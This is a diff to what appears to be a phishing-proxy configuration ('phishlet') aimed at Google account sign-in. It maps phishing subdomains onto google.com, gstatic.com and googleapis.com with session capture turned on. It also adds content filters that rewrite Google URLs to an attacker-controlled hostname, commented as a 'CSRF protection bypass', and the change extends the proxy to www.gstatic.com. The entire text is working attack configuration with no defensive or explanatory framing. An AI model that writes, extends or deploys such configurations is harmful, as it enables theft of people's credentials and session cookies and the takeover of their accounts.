@@ -7,6 +7,7 @@ proxy_hosts:
   - { phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false }
   - { phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false }
   - { phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false }
+  - { phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false }
   - { phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false }
   - { phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false }
   - { phish_sub: 'fonts', orig_sub: 'fonts', domain: 'googleapis.com', session: false, is_landing: false }
@@ -27,6 +28,7 @@ sub_filters:
   
   # Static content and CDN
   - { triggers_on: 'gstatic.com', orig_sub: 'ssl', hostname: '{hostname}', sub: 'accounts', domain: 'google.com', search: 'ssl.gstatic.com', replace: 'ssl.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'image/*', 'font/*']}
+  - { triggers_on: 'gstatic.com', orig_sub: 'www', hostname: '{hostname}', sub: 'accounts', domain: 'google.com', search: 'www.gstatic.com', replace: 'www.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'image/*', 'font/*']}
   
   # Security headers and CSRF protection bypass
   - { triggers_on: 'google.com', orig_sub: 'accounts', hostname: '{hostname}', sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com', replace: 'https://accounts.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain']}
